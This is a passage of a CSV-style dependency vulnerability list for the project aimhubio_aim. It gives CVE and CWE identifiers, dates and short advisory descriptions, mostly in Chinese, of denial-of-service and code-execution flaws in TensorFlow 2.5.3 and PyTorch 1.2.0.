Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.EditDistance对于实现的验证不完整。攻击者可以传递负值来利用该漏洞触发基于分段错误的拒绝服务。",2,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25660,CWE-476,2023-03-24,Google TensorFlow 是一套用于机器学习的开源平台。该漏洞源于当 `tf.raw_ops.Print` 的参数 `summarize` 为零时，新方法 `SummarizeArray<bool>` 会引用空指针，导致段错误。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35934,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.1、2.8.1和 2.7.2版本存在安全漏洞，该漏洞源于TensorFlow 中 tf.reshape op 的实现很容易受到张量中元素数量溢出影响，导致 CHECK-failure（断言失败），攻击者利用该漏洞可以导致服务拒绝。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35970,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizedInstanceNorm 被赋予 x_min 或 x_max 非零等级的张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35989,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 MaxPool 接收到一个窗口大小的输入数组 ksize 的维度大于其输入张量 input 时，GPU 内核会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35996,CWE-369,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于如果 Conv2D 被指定为空 input 并且 filter 和 padding 大小有效，则输出全为零。这会导致除零浮点异常，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29198,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.SparseTensorToCSRSparseMatrix 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35999,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 Conv2DBackpropInput 接收到空的 out_backprop 输入（例如 [3, 1, 0, 1] ）时，当前的 CPU/GPU 内核断言失败（一个带有 dnnl，另一个带有 cudnn）。这可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41909,CWE-20 CWE-476,2022-11-18,Google TensorFlow 是一套用于机器学习的开源平台。在某些版本（如 2.11、2.10.1 及之前的 2.10.x、2.9.3 及之前的 2.9.x 版本，以及 2.8.4 之前的 2.8.x 版本）中，一个无效的 `CompositeTensorVariant` 张量输入 `encoded` 会导致 `tf.raw_ops.CompositeTensorVariantToComponents` 触发段错误存。这是由于输入的验证不当导致的代码缺陷。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29211,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.histogram_fixed_width值出现非数字元素时应用会发生崩溃。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36026,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果给 QuantizeAndDequantizeV3 一个非标量 num_bits 输入张量，它会导致断言失败，可以用来触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25669,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于如果 `tf.raw_ops.AvgPoolGrad` 的步幅和窗口大小不是正数，它会给出浮点异常。",2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29194,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.DeleteSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,2.5.3,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35991](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026856), in `TensorListScatter` and `TensorListScatterV2` via non scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1)
",3,0
aimhubio_aim,tensorflow,2.5.3,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35935](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026914) in `SobolSample` via assumed scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit #1](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf)
- [GitHub Commit #2](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)
",2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41908,CWE-20,2022-11-18,Google TensorFlow是一个用于机器学习的端到端开源平台。该漏洞源于不是UTF-8字节串的输入'token'将在'tf.raw_ops.PyFunc'中触发'CHECK'失败。涉及的版本包括2.8.4之前的版本、2.9.0到2.9.3和2.10.0版本。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29210,CWE-120 CWE-122 CWE-787,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.8.0版本存在安全漏洞，该漏洞源于TensorKey散列函数使用了非常差的常量散列函数AllocatedBytes()来实现总估计。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2021-41201,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞可能导致未初始化的变量访问。",2,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25661,CWE-20,2023-03-27,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。TensorFlow 2.11.1之前版本存在输入验证错误漏洞，该漏洞源于恶意的无效输入会使tensorflow模型崩溃，并可用于触发拒绝服务攻击。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25675,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于当使用 XLA 运行 2.12.0 和 2.11.1 之前的版本时，如果给定的参数 weights 与参数 arr 的形状既不相同，也不是长度为 0 的张量，则 `tf.raw_ops.Bincount` 会出现段错误。",2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41883,CWE-125,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。该漏洞源于操作接收到不同数量的输入时，错误地处理输入大小，导致执行程序崩溃。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29203,CWE-190,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于tf.raw_ops.SpaceToBatchND存在整数溢出问题。攻击者可以通过断言失败利用该漏洞实现拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29207,CWE-20 CWE-475,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于当提供给应用的资源句柄无效时，多个tensorflow操作在急切模式下行为异常。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35968,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 AvgPoolGrad 的实现没有完全验证输入 orig_input_shape 。这会导致断言失败，该失败可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25672,CWE-476,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在代码问题漏洞，该漏洞源于函数 `tf.raw_ops.LookupTableImportV2` 无法处理 `values` 参数中的标量并给出 NPE。",2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25668,CWE-122 CWE-125,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。存在安全漏洞，攻击者可以利用该漏洞访问不受用户控制的堆内存，从而导致程序崩溃或远程代码执行。,1,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41895,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `MirrorPadGrad` 的输入 `paddings` 过大，TensorFlow 将生成堆信息外带（Out of Band）错误，导致缓冲区溢出。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35994,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 CollectiveGather 接收到标量输入 input 时，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41880,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于 `BaseCandidateSamplerOp` 函数接收到 `true_classes` 中的值大于 `range_max` 时，会发生堆外读取。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29216,CWE-94,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在代码注入漏洞，该漏洞源于saved_model_cli工具存在代码注入问题。",2,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35986,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 RaggedBincount 被赋予一个空的输入张量 splits ，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35938,CWE-125,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 GatherNd 函数接受确定输入和输出大小的参数。如果给定的输入大于或等于输出的大小，则会触发越界内存读取或崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",2,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29200,CWE-20 CWE-1284,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.LSTMBlockCell 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41896,CWE-20 CWE-1284,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `ThreadUnsafeUnigramCandidateSampler` 的输入 `filterbank_channel_count` 大于允许的最大大小，TensorFlow 将崩溃。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41898,CWE-20,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。出现此漏洞是因为如果 `SparseFillEmptyRowsGrad` 的输入为空，TensorFlow将崩溃。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35935,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于容易受到因断言失败导致的拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25665,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的开源平台。2.12.0版本之前的2.12版本和2.11.1版本之前的2.11版本存在代码问题，该漏洞源于当'SparseSparseMaximum'被赋予无效的稀疏张量作为输入时，会导致空指针解引用错误。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41884,CWE-670,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。当创建的numpy数组的形状为一个元素为零而其他元素之和为一个大数时，可能导致错误，引发应用程序崩溃。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35991,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 TensorListScatter 和 TensorListScatterV2 收到等级大于 1 的 element_shape 时，它们会给出断言失败，这可能会触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36016,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tensorflow::full_type::SubstituteFromAttrs 收到不完全是三个参数的 FullTypeDef& t 时，它会触发 CHECK -fail 而不是返回状态。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29212,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于应用在使用 TFLite 模型转换器创建的某些 TFLite 模型在加载到 TFLite 解释器时会发生崩溃。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29191,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.GetSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36013,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于当 mlir::tfg::GraphDefImporter::ConvertNodeDef 尝试在没有操作名称的情况下转换 NodeDef 时，它会崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35998,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 EmptyTensorList 接收到具有多个维度的输入 element_shape ，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35963,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 FractionalAvgPoolGrad 的实现没有完全验证输入 orig_input_tensor_shape 。这会导致溢出，导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25674,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的端到端开源平台。2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在空指针错误，该漏洞源于启用 XLA 的 RandomShuffle 操作。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35974,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizeDownAndShrinkRange 为 input_min 或 input_max 提供非标量输入，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36017,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 Requantize 被赋予 input_min 、 input_max 、 requested_output_min 、 requested_output_max 非零秩张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41889,CWE-476,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果将量化张量列表分配给属性，则pywrap代码无法解析张量并返回未捕获的‘nullptr’。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41900,CWE-125 CWE-787,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞出现在TensorFlow的池化操作中，导致FractionalMax(AVG)Pool具有非法的pooling_ratio，攻击者可以利用此漏洞访问不受用户控制的堆内存。,2,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36005,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tf.quantization.fake_quant_with_min_max_vars_gradient 接收到非标量的输入 min 或 max 时，它会给出可能触发拒绝服务攻击的断言失败。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-27579,CWE-697,2023-03-24,TensorFlow是一个用于机器学习的端到端开源平台。使用小于1的参数“filter_input_channel”构建tflite模型会导致浮点异常(FPE)。该漏洞在2.12版本中被修复。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36018,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果为 RaggedTensorToVariant 提供了一个 rt_nested_splits 列表，其中包含除 1 之外的等级张量，则会导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25664,CWE-120 CWE-122,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于TAvgPoolGrad中存在堆缓冲区溢出，影响版本为2.12.0及之前的版本（不包括2.11.1）。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-41888,CWE-20,2022-11-18,TensorFlow是一个用于机器学习的开源平台。在GPU上运行时，`tf.image.generate_bounding_box_proposals`函数收到一个未进行检查的`scores`输入，该输入必须为4级。,3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2023-25670,CWE-476,2023-03-24,TensorFlow是一个强大的开源机器学习框架，用于构建和训练各种复杂的神经网络模型。在版本2.12.0之前的2.12和版本2.11.1之前的2.11中，QuantizedMatMulWithBiasAndDequantize操作存在零点错误，可能导致空指针解引用问题。,2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29204,CWE-20 CWE-191,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于tf.raw_ops.UnsortedSegmentJoin 对于输入的参数存在不完全验证。攻击者利用该漏洞可以触发断言失败实现拒绝服务攻击。",3,0
aimhubio_aim,torch,1.2.0,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
aimhubio_aim,torch,1.2.0,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
aimhubio_aim,torch,1.2.0,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
aimhubio_aim,torch,1.2.0,True,CVE-2024-5480,CWE-77,2024-06-06,PyTorch 是一个流行的开源深度学习框架，广泛用于研究和生产环境。torch.distributed.rpc框架用于在分布式训练场景中支持RPC操作。在2.2.2版本之前，该框架在RPC操作期间没有正确验证被调用的函数，这导致攻击者可以在多CPU RPC通信过程中，通过内置的Python函数（如eval）执行任意命令。,2,2
aimhubio_aim,torch,1.2.0,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
aimhubio_aim,torch,1.2.0,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
aimhubio_aim,torch,1.2.0,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
aimhubio_aim,torch,1.2.0,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
aimhubio_aim,torch,1.2.0,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
